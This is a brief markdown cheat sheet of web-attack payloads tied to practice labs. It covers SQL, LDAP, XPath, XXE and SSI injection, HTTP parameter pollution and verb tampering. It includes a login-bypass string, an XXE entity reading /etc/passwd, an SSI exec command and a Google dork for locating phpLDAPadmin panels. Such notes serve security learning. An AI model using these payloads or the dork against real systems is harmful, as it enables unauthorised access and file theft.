# Cross Site Scripting (Reflected & Stored)
Lab : http://testphp.vulnweb.com/index.php

# HTTP Parameter Pollution
Lab : https://bwapp.hakhub.net/hpp-1.php
Payload : &movie=2

# SQL Injection
Lab : https://juice-shop.herokuapp.com/#/login
Payload : admin' or '1'='1'--

# HTTP Verb Tampering
Lab : http://challenge01.root-me.org/web-serveur/ch8/

# LDAP Injection

Google Dork - 
intitle:"phpLDAPadmin" inurl:cmd.php

Login Bypass - 
user=*
password=*
--> (&(user=*)(password=*))

# XML Injection
Lab : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
Payload :
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
&xxe;

# XPATH Injection
Lab : https://bwapp.hakhub.net/xmli_1.php
Payload : ' or id='1

# SSI Injection 
Payload : <!--#exec cmd="OS_COMMAND" -->

# Code Injection
Lab : https://bwapp.hakhub.net/phpi.php
